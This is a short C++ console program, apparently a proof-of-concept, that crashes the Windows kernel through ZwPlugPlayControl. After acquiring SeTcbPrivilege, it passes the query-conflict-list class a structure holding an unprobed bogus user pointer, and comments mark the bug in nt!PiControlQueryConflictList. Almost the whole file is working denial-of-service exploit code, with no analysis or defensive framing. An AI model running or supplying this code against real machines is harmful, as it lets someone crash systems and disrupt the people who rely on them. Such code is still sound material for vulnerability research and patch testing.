// NtPlugPlayControl_DOS.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"
#include "Header.h"





int _tmain(int argc, _TCHAR* argv[])
{



	void* pBackupMemory = VirtualAlloc(0,0x1000,MEM_COMMIT,PAGE_READWRITE);

	

struct _PLUG_PLAY_QUERY_CONFLICT_LIST
{
  _UNICODE_STRING uniInstancePath;
  __int64 pUserInfo;
  int UserInfoLength;
  char PadX[4];
  __int64 pBackupMemory;
  int BackupMemorySize;
  int PadY;
  int Status;
  int PadZ;
};
	BOOL bAcc_tcb = Acquire_Tcb();
	if(!bAcc_tcb)
	{
		printf("Warning: Can't acquire SeTcbPrivilege\r\n");
		return -55;
	}
	_PLUG_PLAY_QUERY_CONFLICT_LIST ConfX = {0};
	ConfX.pBackupMemory = (__int64)pBackupMemory;//any
	ConfX.BackupMemorySize = 0x20;
	ConfX.pUserInfo = 0xCECECECEFEFEFEFE;//this address is not probed, bug here
	ConfX.UserInfoLength = 0x28;
	//Now causing a crash in nt!PiControlQueryConflictList
	int ret = ZwPlugPlayControl(0x12,
		(ulonglong)(&ConfX),
		sizeof(_PLUG_PLAY_QUERY_CONFLICT_LIST) /* 0x38 */);

	printf("ZwPlugPlayControl, ret: %X\r\n",ret);
	return 0;
}

